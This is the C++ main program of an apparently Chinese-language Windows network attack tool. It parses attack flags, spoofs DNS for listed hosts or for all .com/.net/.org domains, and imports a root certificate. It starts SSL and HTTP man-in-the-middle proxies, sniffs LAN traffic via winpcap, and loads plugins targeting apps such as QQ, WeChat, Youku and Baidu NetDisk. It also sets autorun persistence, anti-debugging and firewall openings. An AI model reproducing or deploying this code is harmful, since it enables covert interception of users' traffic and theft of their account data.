
#define SECURITY_WIN32

#include "PreparePacket.h"
#include <algorithm>
#include <windows.h>
#include <winsock2.H>
#include <Iptypes.h >
#include <iphlpapi.h>
#include <string>
#include <iostream>
#include <vector>
#include <conio.h>
#include <DbgHelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "include\\pcap.h"
#include "include\\pcap\\pcap.h"
#include "main.h"
#include "attacker.h"
#include "Public.h"
#include "Packet.h"
#include "snifferpacket.h"
#include "NetworkDevice.h"
#include "Config.h"
#include "safeGuard.h"
#include "attack.h"
#include "ssl\\sslentry.h"
#include "winpcap.h"

#include "HttpUtils.h"
#include "cipher/CryptoUtils.h"
#include "ssl/WeixinAndroid.h"
#include "security.h"
#include "FileOper.h"
#include "informer.h"
#include "utils/Tools.h"
#include "cipher/RSA.h"
#include "dnsutils/DnsProxy.h"
#include "ssl/HttpProxyListener.h"
#include "ssl/SSLProxyListener.h"
#include "ssl/informerServer.h"
#include "ssl/baofeng.h"
#include "ssl/QQManager.h"
#include "ssl/QQAndroid.h"
#include "cipher/sha1.h"
#include "cipher/UrlCodec.h"
#include "cipher/Base64.h"

#include "support/aos_crc64.h"
#include "ssl/HuYaPlugin.h"
#include "ssl/YoukuPC.h"
#include "ssl/QQ.h"
#include "ssl/Plugin2345.h"
#include "ssl/aliProtect.h"
#include "ssl/qukan.h"
#include "gateWay/gateway.h"
#include "gateWay/gateway.h"
#include "DnsUtils/dnsUtils.h"
#include "Utils/basesocket.h"
#include "ssl/IqiyiPlugin.h"
#include "ssl/WpsPlugin.h"
#include "ssl/QQ.h"
#include "Utils/simpleJson.h"
#include "cipher/compression.h"
#include "ssl/baiduNetDisk.h"
#include "ssl/peanutShell.h"
#include <conio.h>
#include "myDvert.h"
#include "Helper.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"./lib\\wpcap.lib")
#pragma comment(lib,"./lib\\wpcap.dll")
#pragma comment(lib,"./lib\\zlib.lib")
#pragma comment(lib,"./lib\\libcrypto.lib")
#pragma comment(lib,"./lib\\libssl.lib")
#pragma comment(lib,"./lib\\openssl.lib")

//#define WINDIVERT_APPROACH

using namespace std;


int gAttackToggle = 0;
int gAttackMode = 0;


void test() {
	HttpUtils::ipatoi("192.168.1.3");
}

int main(int argc, char** argv)
{
	int	ret = 0;

#ifdef _DEBUG
	test();
#endif

	string username = "";
	string password = "";
	int netcardNum = -1;
	int isattack = 0;
	int isimport = 0;
	int isalldns = 0;
	string server = "";
	int mode = 0;
	unsigned long serverIP = 0;

	for (int num = 1; num < argc; num++) {
		if (lstrcmpiA(argv[num], "--p") == 0) {
			password = argv[num + 1];
		}
		else if (lstrcmpiA(argv[num], "--u") == 0) {
			username = argv[num + 1];
		}
		else if (lstrcmpiA(argv[num], "--m") == 0) {
			mode = atoi(argv[num + 1]);
			gAttackMode = mode;
		}
		else if (lstrcmpiA(argv[num], "--s") == 0) {
			server = argv[num + 1];
			serverIP = HttpUtils::ipatoi(server.c_str());
		}
		else if (lstrcmpiA(argv[num], "--n") == 0) {
			netcardNum = atoi(argv[num+1]);
		}
		else if (lstrcmpiA(argv[num], "-attack") == 0) {
			isattack = 1;
		}
		else if (lstrcmpiA(argv[num], "-import_root_cert") == 0) {
			isimport = 1;
		}
		else if (lstrcmpiA(argv[num], "-dns_all_attack") == 0) {
			isalldns = 1;
		}
		else {
			printf("unrecognized command parameter:%s\r\n", argv[num]);
		}
	}

	HANDLE hMutext = (HANDLE)Public::singleInstance();
	if (hMutext == FALSE)
	{
		log("An instance of program has already been running\n");
		ret = _getch();
		exit(-1);
	}

	WSADATA	stWsa = { 0 };
	ret = WSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (ret)
	{
		log("network init error:%d\n", GetLastError());
		exit(-1);
	}

	string path = Public::getpath();
	SetCurrentDirectoryA(path.c_str());

	int winpcap = 1;
	int opensslctl = 0;
	string sign = "";
	vector<string> hostlist = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcap,&opensslctl, &gAttackMode, sign
		,server, netcardNum,username,password);
	if (hostlist.size() == 0) {
		//log("parse config file:%s error\r\n", CONFIG_FILENAME);
		//return -1;
	}

	int dnsItemCnt = Config::parseDnsCfg(DNS_FILENAME, hostlist);
	printf("dns target total:%u\r\n", dnsItemCnt);

	ret = SafeGuard::loginCheck(gAttackMode, username, password);
	if (ret <= 0)
	{
		log("username or password error\r\n");
		exit(-1);
	}
	
	string adaptername = NetworkDevice::ChooseNetcard(&gLocalIP, &gNetmask, &gRouterIP, gLocalMac, netcardNum, &gDnsServer);
	if (adaptername == "")
	{
		log("Choose Netcard error\r\n");
		return -1;
	}

	string dmackey = HttpUtils::getmac(gLocalMac);
	SafeGuard::signCheck(dmackey, username, password, sign);

	if (isattack) {
		gAttackToggle = 1;
	}
	int opensslcontrol = 0;
	opensslcontrol |= (isalldns << 3);
	opensslcontrol |= (isattack << 2);
	opensslcontrol |= (isimport<<1);
	opensslcontrol |= OPENSSL_CLEAR_PATH;

	if (gAttackMode == ATTACK_TEST_MODE)
	{
		gNetIP = GetInetIPAddress();
		gstrNetIP = HttpUtils::ip2str(gNetIP);
		serverIP = gLocalIP;
	}
	else if (gAttackMode == ATTACK_SERVER_MODE)
	{
		gNetIP = GetInetIPAddress();
		gstrNetIP = HttpUtils::ip2str(gNetIP);
		//make sure serverip is correct in this mode
	}
	else if (gAttackMode == ATTACK_CLIENT_MODE)
	{
		//make sure serverip is correct in this mode
	}

#ifndef _DEBUG
	ret = Tools::autorun(username, password, netcardNum);
	DWORD debugTd = 0;
	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SafeGuard::antiDebug, 0,0, &debugTd));
#endif
	
	// 标准去重模式,vector、set、map这些容器的end()取出来的值不是最后一个、end的前一个才是最后一个,prev(xxx.end())取出最后一个
	sort(hostlist.begin(), hostlist.end());  // 先排序
	auto iter = unique(hostlist.begin(), hostlist.end());
	hostlist.erase(iter, hostlist.end());

	if (isalldns) {
		hostlist.push_back(".com");
		hostlist.push_back(".net");
		hostlist.push_back(".org");
	}

	vector<string> dnslist = hostlist;
	hostlist.push_back(HttpUtils::getIPstr(serverIP));
	hostlist.push_back(HttpUtils::getIPstr(gLocalIP));
	hostlist.push_back(gstrNetIP);
	vector<string> targetlist = hostlist;

	//dnslist.push_back("127.0.0.1");

	ret = Config::shiftDnsFormat(dnslist);

	DnsUitls* dnsutils = new DnsUitls(dnslist);

	DWORD cmode = 0;
	HANDLE hc = GetStdHandle(STD_INPUT_HANDLE);
	ret = GetConsoleMode(hc, &cmode);
	//nRetCode = SetConsoleMode(hc, ~ENABLE_QUICK_EDIT_MODE);

	printf("checking files cryption,please wait...\r\n");
	string pluginPath = Public::getPluginPath();
	ret = FileOper::checkFileCryption(pluginPath);

	gServerIP = serverIP;
	gLocalPath = path;
	gstrLocalIP = HttpUtils::ip2str(gLocalIP);
	gstrServerIP = HttpUtils::ip2str(gServerIP);

	HttpUtils::ipv4toipv6((unsigned char*)&gLocalIP, gLocalIPV6);

	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE) {
		ret = Tools::addFirewallPort(HTTP_PORT, "HTTP", "TCP");
		ret = Tools::addFirewallPort(SSL_PORT, "SSL", "TCP");
		ret = Tools::addFirewallPort(INFORMER_PORT, "INFORMER", "TCP");

		ret = SSLEntry::SslEntry(serverIP, gLocalIP, path, opensslcontrol, hostlist, targetlist);

		ret = Tools::setNetworkParams();

		printf("Server mode is ready to work...\r\n");
	}

	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE || gAttackMode == ATTACK_STANDBY_MODE) {
		ret = ObjectParser(hostlist);

		string searchpath = gLocalPath + "plugin\\";
		vector<string>usernames;
		ret = FileOper::searchDir((char*)searchpath.c_str(), usernames);
		
		for (int i = 0; i < usernames.size(); i++) {
			printf("\r\n%d.\t\t%s\r\n",i, usernames[i].c_str());
		}

		do
		{
			int packnum = 0;
			//printf("\r\nPlease select the number of the server packet:\r\n");
			//scanf("%d", &packnum);
			if (packnum < usernames.size() && packnum >= 0) {
				//lstrcpyA(G_USERNAME, usernames[packnum].c_str());
				break;
			}
		} while (1);
	}

	if (gAttackMode == ATTACK_SERVER_MODE)
	{
		//nRetCode = Tools::initException(hMutext, username, password, netcard_selected);
		Sleep(-1);
	}

	//inet_ntoa返回一个字符指针，指向一块存储着点分格式IP地址的静态缓冲区（同一线程内共享此内存）

	if (gAttackMode == ATTACK_CLIENT_MODE || gAttackMode == ATTACK_TEST_MODE || gAttackMode == ATTACK_STANDBY_MODE)
	{
		string devname = string(WINPCAP_NETCARD_NAME_PREFIX) + adaptername;
		pcap_t* pcapt = Winpcap::init(devname, winpcap, gNetmask);
		if (pcapt == 0)
		{
			log("winpcap init error\r\n");
			return -1;
		}
		printf("device:%s,mask:%08x,winpcap delay:%d\r\n", devname.c_str(), gNetmask, winpcap);

		string pluginPath = Public::getDefaultUserPluginPath();
		ret = access(pluginPath.c_str(), 0);
		if (ret)
		{
			log( "data path:%s not exist!\r\n", G_USERNAME);
			exit(-1);
		}

		if (1) {
			printf("parsing gateway mac and ip,please wait...\r\n");
			Gateway* gateway = new Gateway(pcapt, serverIP, gLocalIP, gLocalMac);
			int totalpack = gateway->getGateWay();
			if (totalpack)
			{
				GATEWAYPARAM p = gateway->getGatewayParam();
				printf("gate way mac:%s,mac count:%d,ip:%s\r\n",
					HttpUtils::getmac(p.mac.DstMAC).c_str(), p.cnt, HttpUtils::getIPstr(p.ip.SrcIP).c_str());
			}
		}
		printf("Client mode is ready to work...\r\n");

#ifndef WINDIVERT_APPROACH
		ret = SnifferPacket::peeping(pcapt, serverIP, gLocalIP, pluginPath, gAttackMode);
		pcap_close(pcapt);
#else
		ret = CloseHandle(CreateThread(0,0,(LPTHREAD_START_ROUTINE) winDivert,(LPVOID)gLocalIP,0,0));
		Sleep(-1);
#endif		
	}

	return ret;
}

//cmd执行程序时容易卡住 取消快速编辑模式

//全局变量空间一般比较大，因此大小超过1M的变量尽量声明为全局变量或者静态变量。

//统计代码行数 ^b*[^:b#/]+.*$